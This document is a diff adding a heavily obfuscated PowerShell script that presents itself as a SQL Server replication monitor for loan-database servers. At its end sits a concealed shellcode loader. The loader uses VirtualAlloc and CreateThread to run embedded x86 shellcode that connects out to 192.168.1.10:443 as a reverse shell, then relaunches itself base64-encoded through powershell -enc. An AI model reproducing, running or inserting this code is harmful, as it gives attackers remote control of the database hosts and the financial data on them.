@@ -1,0 +1,206 @@
+$VbjQUL  =  [tYpe]("{3}{0}{2}{1}"-F'St','oNVERT','EM.c','Sy')  ; SET-vAriABLe 5YO  ( [TypE]("{6}{4}{1}{3}{2}{5}{0}" -F'NG','T','t.','ex','M.','encodI','SyStE')  );    SET QrZAoc (  [TyPe]("{1}{0}"-f 'tR','inTp')); 
+
+
+
+
+${Sta`TuS`S`eR`VER} = ("{2}{0}{1}" -f'UTI','L18','XSQL')
+${stAtUS`Db} = ("{0}{1}" -f'S','tatus')
+${E`Nv} = ${A`RGS}[0]
+
+
+
+switch (${e`NV}) {        
+    ("{1}{0}"-f'ROD','P')      { ${s`ErVerL`i`St} = ((("{3}{7}{12}{0}{9}{1}{2}{8}{4}{10}{6}{5}{11}" -f 'onitor','1oEW','dexmaoEWd','o','server','D','PRO','EWoEWx','ataoEW','1','listsoEWSMC_','.txt','m'))."reP`lace"('oEW',[StRINg][cHAR]92)) }
+     
+    ("{0}{1}" -f'STA','GE')     { ${sERV`ER`lIst} = ((("{16}{4}{10}{5}{1}{8}{3}{0}{14}{9}{12}{7}{6}{13}{11}{15}{2}{17}"-f 'dexmaF7d','to','t','1F7d','F7d','i','serverlistsF7','7d','r1','a','xmon','C_DEMO','F','dSM','dat','.','F7d','xt'))  -rePlacE'F7d',[CHaR]92) }
+						
+	"IMP"       { ${SE`RVER`l`ist} = ((("{11}{6}{0}{1}{7}{4}{17}{18}{14}{10}{5}{2}{12}{15}{13}{8}{16}{9}{3}"-f'monitor11aR','t','rli','xt','x','ve','Rtx','de','_I','t','r','aRta','s','saRtSMC','aRtse','t','MP.','maaRtda','ta'))-rEPLAce 'aRt',[ChAr]92) }
+                
+    "QA"        { ${s`erVeRl`i`ST} = ((("{8}{7}{2}{5}{4}{10}{3}{1}{9}{0}{6}" -f'ists{','d','moni','a{0}','{0','tor11','0}SMC_QA.txt','}x','{0}{0','ata{0}serverl','}dexm'))  -f  [CHAR]92) }
+}
+${S`ERvERli`sT}
+
+
+
+${seR`VER`qu`ERY} = 
+((("{9}{10}{0}{35}{26}{15}{14}{1}{22}{25}{33}{12}{8}{2}{3}{29}{38}{11}{32}{6}{31}{16}{30}{21}{19}{36}{5}{17}{18}{27}{20}{37}{13}{28}{34}{4}{24}{7}{23}" -f' S','Datab','i','butionIB','server','LSVC2','I','D','istr','S','ELECT','e','d','pli','WHERE ','es
+','%.MDFIB5
+','1%IB5 ','--',' NOT LIKE IB5%','an SMC','rver','a','ER BY 1','
+OR','seName L','tabas',' not ','c','5
+AND','AND Se','KE IB5',' L','IKE IB5','ation ','erver FROM SQLDa','PSQ',' re',' Filenam'))  -CrEplACe([cHAR]73+[cHAR]66+[cHAR]53),[cHAR]39)
+
+${rePlI`Te`MsQU`ErY} = 
+((("{36}{55}{9}{27}{50}{22}{11}{43}{5}{17}{48}{63}{18}{34}{7}{49}{20}{4}{30}{23}{31}{64}{53}{2}{28}{62}{41}{39}{38}{21}{26}{33}{45}{12}{6}{59}{44}{1}{65}{19}{47}{16}{52}{57}{51}{37}{35}{8}{58}{42}{15}{54}{46}{32}{60}{61}{56}{24}{10}{3}{40}{66}{13}{0}{29}{14}{25}" -f 'tion_associati','iability, br_REO, channels
+		, codes, c','L,
+	[loan_pric',' codes
+		, customer_elements, funding, in','LL,
+	','int','oan_data','] NULL,
+	[funding]','
+		@@SERVERNAME AS ServerName
+		, DB_NAME() AS DBN','e] [varchar](64) NOT NULL,
+	[Databasename] [','ncome, br_liability
+		, br_REO, channels,','ULL,
+	[appraisal] [int] NULL,
+	[borrow',' AS DBName
+		, addl_l','nstitu','ct_channel_assoc, property, servicing
+		, shipping, underwriting)
+) AS P','.tables','on
+		, loan_appl, loan_fees, loan_price_hi','] NULL,
+	[br_expense] [int','
+	[customer_eleme','tomer_el','nnel_assoc] [int] NU','ing] [in','data] [int] N','tution] [int]',', br_i','ivotTable;XMn
+
+SELECT * FROM @ReplItems
+ORDER BY 1,2','t] NULL,','varchar](128) NOT NULL,
+	[addl_lo','e_history] [int] NULL,
+	[loan_prod]','on, loan_appl
+		, loan_fees, loan_price_history, loan_prod
+		, loan_regulatory, loan_status, product
+		, produ','[insti',' NULL,
+	[institution_associati','ON t.object_id = c.object_id
+JOIN sys.types ty ON c.system_type_id = ty.system_type_id
+where t.is_published = 1 
+	or t.is_mer','
+	[shipping] [int] NULL,
+','nts] [int','T','DECL','el_assoc, property
+		, servicing, shipping, underwriting
+FROM
+(SELECT	DISTINC','[int] NULL,
+	[property] [int] NULL,
+	[servic','annel_assoc] ','st_channel_assoc
+		, institutio','[loan_regulatory] [int] NULL,
+	[loan_status] [int] NULL,
+	[product] [int] NULL,
+	[product_ch',') AS ColumnNum
+FROM sys','er] [int] NULL,
+	[br_address] [','expense, br_income
+		, br_l','	[underwriting] [int] NULL
+)
+	
+INSERT INTO @ReplItems
+EXEC sp_MSForEachDBXMn
+USE ?	
+SELECT ServerName AS ServerName
+		, DB_NAME()','ns c ','ements, funding
+		, inst_channel_assoc, institution, institution_associati','] NULL,
+	[br_income] [int] NULL,
+	[br_liability] [in',' [int] NULL,
+	[inst_cha','an_','	, product, product_chann','story
+		, loan','n_fees] [int] NUL',' t
+JOIN sys.colum','ARE @ReplItems TABLE (
+	[ServerNam','	, br_expense','_prod, loan_regulatory, loan_status
+	','ame
+		, t.name AS TableName
+		, COUNT(c.name',', appraisal, borrower
+		, br_address, br_','ge_published = 1
+	or t.is_schema_published = 1
+GROUP BY t.name
+--ORDER BY 2,3
+) AS SourceTable
+PIVOT
+(SUM(ColumnNum)
+FOR TableName IN (addl_','loan_data
+		, appraisal, borrower, br_address
+	',' [int] NULL,
+	','t] NULL,
+	[br_REO] [int] NULL,
+	[channels] [int] NULL,
+	[codes] [int] NULL,','on] [int] NULL,
+	[loan_appl] [int] NULL,
+	[loa','us','n, i'))."repl`ACE"(([cHAR]88+[cHAR]77+[cHAR]110),[sTRInG][cHAR]39))
+
+
+
+function Run-`qu`eRy()
+{
+	param (
+	${s`ql`Qu`eRy},
+	${S`qlSEr`VeR},
+	${S`qL`caT`ALog}
+	)
+	
+	${sQLc`On`NectIon} = &("{1}{2}{0}"-f 'w-Object','N','e') ("{0}{3}{6}{1}{2}{5}{4}{7}{8}"-f'Syste','Dat','a.SqlCli','m','.SqlC','ent','.','onnectio','n')(('Dat'+'a '+"Source=$SqlServer;Integrated "+'Se'+'curit'+'y=SSPI'+';Initial'+' '+"Catalog=$SqlCatalog;"));
+	
+	${s`QLc`Md} = &("{0}{2}{1}" -f'N','bject','ew-O') ("{1}{0}{8}{4}{6}{7}{2}{5}{3}" -f'm','Syste','ent.Sql','nd','ta','Comma','.Sql','Cli','.Da')
+	${SQLc`MD}."cOM`MAn`DT`eXt" = ${S`QLQ`Ue`Ry}
+	${S`QlCmd}."c`onNect`IOn" = ${S`qlcoNN`ec`T`IOn}
+	
+	${Sq`laDAPT`eR} = &("{0}{1}{2}"-f'New','-Objec','t') ("{5}{0}{7}{6}{3}{2}{1}{4}" -f'ystem.','.SqlDat','Client','a.Sql','aAdapter','S','at','D')
+	${s`QL`AdAp`TEr}."SEl`E`CtCOMMANd" = ${SQ`lcmd}
+	
+	${D`A`TASEt} = &("{1}{2}{3}{0}"-f 'ect','Ne','w-','Obj') ("{4}{2}{1}{0}{3}" -f'DataSe','a.','tem.Dat','t','Sys')
+	${a} = ${sqlaD`A`pt`ER}.("{1}{0}"-f 'ill','F').Invoke(${D`Ata`set})
+	
+	${S`qL`CON`NeCtioN}.("{1}{0}" -f 'ose','Cl').Invoke()
+	
+	${d`AT`AseT}."tA`BL`ES" | &("{2}{0}{1}" -f 'lect','-Object','Se') -ExpandProperty ("{0}{1}" -f 'Ro','ws')
+}
+
+function TXt`-`extRaCT{
+  param([string]${t`Xt`NaME})
+  ${RET`U`R`NArRaY} = &("{2}{1}{0}" -f 'ontent','et-C','G') ${TX`T`NaME}
+  return ${R`Et`UrNArRay}
+}
+
+
+
+${Sq`LCo`N`NEcTi`on} = &("{0}{2}{1}" -f 'New-O','ject','b') ("{7}{0}{3}{5}{2}{1}{6}{4}" -f'em.D','lClient.SqlC','Sq','a','on','ta.','onnecti','Syst')
+${sQ`lcO`NNeC`Tion}."COnNe`ctION`STrI`NG" = "Server={0};Database={1};trusted_connection=true;" -f ${S`TA`TUsServ`er}, ${S`TAT`USDb}
+
+${S`qlCOnn`ecTIoN}.("{0}{1}"-f 'Op','en').Invoke();
+
+${sqLCo`MM`A`Nd} = &("{1}{2}{0}" -f 't','New-','Objec') ("{1}{0}{3}{2}{5}{4}" -f'm.Data','Syste','Cli','.Sql','and','ent.SqlComm')
+${sQL`Co`Mm`AND}."COnne`c`TIon" = ${SqlCOnN`Ec`T`Ion}
+
+
+
+${SQ`LC`OmmAnD}."CO`Mm`AndteXt" = ("{1}{7}{3}{5}{13}{2}{4}{9}{6}{10}{11}{14}{0}{8}{12}{15}" -f 'Upd','DELETE F','RE ','CRe','DATE','plicatedItems WH','(h','ROM SM','ate','DIFF','h, L','a',', GetDate','E','st','()) > 6 ')
+${SQL`co`M`Mand}.("{3}{2}{0}{4}{1}" -f'n','ery','ecuteNo','Ex','Qu').Invoke();
+
+
+${P`U`BLishE`RS} = &("{2}{0}{1}" -f 'a','ct','Txt-extr') ${Ser`VeRLi`St}
+
+	
+
+foreach (${puBl`i`sHeR} IN ${Pub`Li`shE`RS}) {
+	
+	${data`BA`sEs} = &("{2}{1}{0}" -f 'y','un-Quer','R') -SqlQuery ${Re`PL`ItEMs`qu`eRy} -SqlServer ${pUB`Li`SheR}
+	
+	if (!${dAtAba`S`eS}) {
+		&("{0}{1}{2}"-f'Wri','te-H','ost') ('Fo'+'und '+'a'+'n '+'em'+'pt'+'y '+'d'+'a'+'tabase '+'reco'+'rd '+'f'+'or '+'serve'+'r '+"$Publisher.")
+		}
+	else {
+		${dB`N`ew} = ${dATa`B`AS`eS}[0]."dA`TA`BASEnaMe"
+		}
+	
+	foreach (${D`B} IN ${daT`Ab`AS`Es} ) {
+		${dBCUR`R`eNT} = $(${d`B}."DA`T`AbaS`eNAMe")
+		
+		
+		if (!${DB`CUrR`E`Nt}) {
+			break;
+			}
+		
+		
+		${sQLco`MMa`ND}."COMM`AN`DtExt" = 
+			"INSERT INTO SMCReplicatedItems (ServerName, DatabaseName, addl_loan_data, appraisal, borrower, br_address,
+				br_expense, br_income, br_liability, br_REO,
+				channels, codes, customer_elements, funding,
+				inst_channel_assoc, institution, institution_association, 
+				loan_appl, loan_fees, loan_price_history, loan_prod, 
+				loan_regulatory, loan_status, product, product_channel_assoc, 
+				property, servicing, shipping, underwriting, LastUpdate)
+			VALUES
+			('$($db.Servername)', '$($db.DatabaseName)', '$($db.addl_loan_data)', '$($db.appraisal)', '$($db.borrower)', '$($db.br_address)',
+				'$($db.br_expense)', '$($db.br_income)', '$($db.br_liability)', '$($db.br_REO)',
+				'$($db.channels)', '$($db.codes)', '$($db.customer_elements)', '$($db.funding)',
+				'$($db.inst_channel_assoc)', '$($db.institution)', '$($db.institution_association)',
+				'$($db.loan_appl)', '$($db.loan_fees)', '$($db.loan_price_history)', '$($db.loan_prod)',
+				'$($db.loan_regulatory)', '$($db.loan_status)', $($db.product), '$($db.product_channel_assoc)',
+				'$($db.property)', '$($db.servicing)', '$($db.shipping)', '$($db.underwriting)', GetDate())
+			 "
+		
+		${sqlcO`MM`A`Nd}.("{1}{3}{0}{4}{2}"-f 'teNo','Ex','Query','ecu','n').Invoke();
+	}
+}
+${SQL`con`Ne`CtiON}.("{1}{0}"-f'se','Clo').Invoke();
+${DH`2E} = '$nqZC = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $nqZC -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VndM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VndM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VndM,0,0,0);for (;;){Start-sleep 60};';${e} =  $VBJQul::"t`OBAsE64st`RiNg"(  ( dIR vArIAbLE:5YO ).VAlUe::"unI`CoDe".("{1}{0}{2}" -f 'etBy','G','tes').Invoke(${dH`2e}));${T`wZ} = ("{1}{0}"-f' ','-enc');if(  (get-VaRiAbLE  qrZAoc).vALUe::"s`IZE" -eq 8){${j`YEq} = ${EnV:SYs`T`eMR`oOt} + ((("{2}{4}{7}{5}{0}{3}{8}{6}{9}{1}{10}"-f 'h','l','hdHsy','ell','swow64hdHWind','PowerS','dHv1.0','ows','h','hdHpowershe','l'))."re`PlacE"('hdH',[stRing][CHaR]92));&("{1}{0}"-f'x','ie') ('& '+"$JYeq "+"$TwZ "+"$e")}else{;&("{0}{1}"-f'i','ex') ('& '+'po'+'we'+'r'+'shell '+"$TwZ "+"$e");}
